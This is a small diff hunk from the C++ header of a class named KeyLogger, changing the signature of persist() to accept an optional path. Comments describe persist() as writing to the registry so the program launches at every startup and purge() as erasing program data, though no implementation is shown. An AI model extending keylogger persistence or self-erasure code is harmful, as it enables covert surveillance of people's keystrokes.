@@ -70,7 +70,7 @@ class KeyLogger {
 	void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
 	//writes to registry to make the program launch at every startup
-	void persist();
+	void persist(std::string path="");
 
 	//erases program data
 	void purge();
